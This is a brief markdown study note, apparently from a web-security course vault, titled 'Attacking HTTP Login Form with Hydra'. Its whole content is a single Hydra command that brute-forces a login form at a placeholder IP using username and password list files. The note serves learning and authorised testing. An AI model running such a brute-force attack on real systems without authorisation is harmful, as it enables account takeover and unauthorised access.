---
up: "[[Introduction to Web and HTTP Protocol]]"
---

# Attacking HTTP Login Form with Hydra

```bash
hydra -L users.txt -P pass.txt <ip> http-post-form "/login.php:login^USER^&password=^PASS^:Error message"
```
